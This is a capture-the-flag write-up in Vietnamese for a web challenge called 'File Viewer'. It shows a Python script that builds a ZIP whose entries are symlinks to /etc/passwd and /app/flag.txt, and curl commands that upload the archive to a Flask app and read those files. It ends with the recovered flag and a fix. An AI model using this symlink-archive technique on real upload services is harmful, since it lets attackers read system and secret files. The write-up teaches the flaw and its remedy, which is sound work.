---
title: "File Viewer"
category: "Web"
tags: []
solve_date: "2026-10-31"
language: "vi"
---

# File Viewer

## Đề bài

Ứng dụng Flask/Werkzeug nhận ZIP, giải nén rồi phục vụ từng file bằng đường dẫn `/<id>/<filename>`. Mục tiêu là đọc flag ngoài thư mục giải nén.

## Phân tích

Trình giải nén giữ lại symlink trong ZIP. Bước phục vụ file dùng `safe_join` để kiểm tra chuỗi đường dẫn nhưng không kiểm tra đích sau khi hệ điều hành resolve symlink. Tên file vẫn nằm trong thư mục upload, còn nội dung thực tế có thể được đọc từ một đường dẫn khác.

## Lời giải

### 1. Tạo ZIP chứa symlink

Tạo hai entry: `passwd` trỏ tới `/etc/passwd` để kiểm tra primitive và `flag2` trỏ tới `/app/flag.txt`:

```python
import zipfile

z = zipfile.ZipFile('probe.zip', 'w')
for name, target in {'passwd': '/etc/passwd', 'flag2': '/app/flag.txt'}.items():
    zi = zipfile.ZipInfo(name)
    zi.external_attr = (0o120777 << 16)  # symlink
    z.writestr(zi, target)
z.close()
```

`external_attr = 0o120777 << 16` đánh dấu kiểu symlink trong metadata ZIP. Nội dung entry là đường dẫn đích, không phải nội dung của file đó.

Upload ZIP qua endpoint `/analyze`. Trong các lệnh dưới, thay host rút gọn bằng URL instance hiện tại:

```bash
curl -sk -F "file=@probe.zip" https://file-viewer-.../analyze
```

Response liệt kê các link như `/<id>/passwd` và `/<id>/flag2`. Truy cập `passwd` trả nội dung `/etc/passwd`, xác nhận symlink đã thoát khỏi thư mục giải nén.

### 2. Đọc flag

Dùng ID do lần upload vừa tạo và truy cập entry trỏ tới `/app/flag.txt`:

```bash
curl -sk https://file-viewer-.../<id>/flag2
# hiCTF{E45Y_5yml1Nk_69561eb663}
```

Các đối chứng trong bản ghi: `/flag` và `/flag.txt` không tồn tại. `/proc/self/environ` cùng `/proc/self/cmdline` trả rỗng vì cách `send_file` xử lý file proc có kích thước báo cáo bằng 0.

### 3. Nguyên nhân và cách khắc phục

Chặn entry có mode symlink khi giải nén; khi phục vụ file, resolve đường dẫn thực rồi kiểm tra nó vẫn nằm dưới thư mục upload. Chỉ kiểm tra `..` hoặc kết quả nối chuỗi đường dẫn không ngăn được trường hợp này.

## Kết quả

```
hiCTF{E45Y_5yml1Nk_69561eb663}
```
